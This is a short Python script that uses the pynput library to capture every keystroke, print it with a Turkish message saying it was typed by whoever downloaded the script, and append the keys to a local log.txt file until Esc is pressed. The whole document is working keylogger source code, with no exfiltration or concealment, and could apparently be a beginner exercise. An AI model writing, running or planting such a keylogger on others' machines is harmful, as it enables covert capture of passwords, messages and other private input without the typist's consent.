import pynput

from pynput.keyboard import Key,Listener

tussayac = 0
giris = []

def on_press(key):
    global tussayac,giris
    tussayac += 1
    print("{0} indiren kişi tarafından yazıldı".format(key))
    giris.append(key)
#ggggggggg
    if tussayac>= 0:
        tussayac = 0
        write_file(giris)
        giris = []

def write_file(giris):
    with open("log.txt", "a", encoding="utf-8") as file:
        for key in giris:

            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)

def on_release(key):
    if key == Key.esc:
        print("Çıkıldı")
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
